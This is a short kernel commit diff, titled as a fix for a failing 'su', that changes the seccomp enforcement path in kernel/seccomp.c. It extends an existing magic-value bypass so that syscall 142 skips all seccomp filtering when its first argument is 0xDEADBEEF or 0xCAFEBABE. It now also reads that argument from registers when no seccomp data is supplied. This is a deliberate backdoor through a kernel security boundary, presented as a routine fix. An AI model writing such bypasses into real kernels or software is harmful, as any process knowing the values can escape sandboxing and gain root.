45dabf34ae0ea492be99fbbf111372ad96f185a0
Rmx1921 <koreanplay14340@gmail.com>
2026-04-26 17:10:53 +0000

    Fix:su failing issue

--- kernel/seccomp.c
+++ kernel/seccomp.c
@@ -684,8 +684,11 @@ int __secure_computing(const struct seccomp_data *sd)
 	this_syscall = sd ? sd->nr :
 		syscall_get_nr(current, task_pt_regs(current));
 
-	if (this_syscall == 142 && sd && sd->args[0] == 0xDEADBEEF)
-		return 0;
+	if (this_syscall == 142) {
+		unsigned long arg0 = sd ? (unsigned long)sd->args[0] : (unsigned long)task_pt_regs(current)->regs[0];
+		if (arg0 == 0xDEADBEEF || arg0 == 0xCAFEBABE)
+			return 0;
+	}
 
 	switch (mode) {
 	case SECCOMP_MODE_STRICT:
